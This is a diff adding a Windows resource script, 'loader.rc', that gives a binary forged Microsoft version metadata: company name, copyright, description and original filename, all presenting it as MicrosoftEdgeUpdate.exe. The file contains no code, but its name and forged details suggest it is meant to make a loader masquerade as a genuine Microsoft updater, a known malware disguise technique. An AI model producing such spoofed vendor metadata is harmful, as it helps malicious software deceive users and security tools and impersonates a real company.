@@ -1,0 +1,31 @@
+/* loader.rc — metadati PE per MicrosoftEdgeUpdate.exe */
+#include <windows.h>
+
+VS_VERSION_INFO VERSIONINFO
+FILEVERSION     1,3,171,47
+PRODUCTVERSION  108,0,1462,0
+FILEFLAGSMASK   VS_FFI_FILEFLAGSMASK
+FILEFLAGS       0
+FILEOS          VOS_NT_WINDOWS32
+FILETYPE        VFT_APP
+FILESUBTYPE     VFT2_UNKNOWN
+BEGIN
+    BLOCK "StringFileInfo"
+    BEGIN
+        BLOCK "040904B0"
+        BEGIN
+            VALUE "CompanyName",      "Microsoft Corporation"
+            VALUE "FileDescription",  "Microsoft Edge Update"
+            VALUE "FileVersion",      "1.3.171.47"
+            VALUE "InternalName",     "MicrosoftEdgeUpdate"
+            VALUE "LegalCopyright",   "\251 Microsoft Corporation. All rights reserved."
+            VALUE "OriginalFilename", "MicrosoftEdgeUpdate.exe"
+            VALUE "ProductName",      "Microsoft Edge"
+            VALUE "ProductVersion",   "108.0.1462.0"
+        END
+    END
+    BLOCK "VarFileInfo"
+    BEGIN
+        VALUE "Translation", 0x0409, 0x04B0
+    END
+END
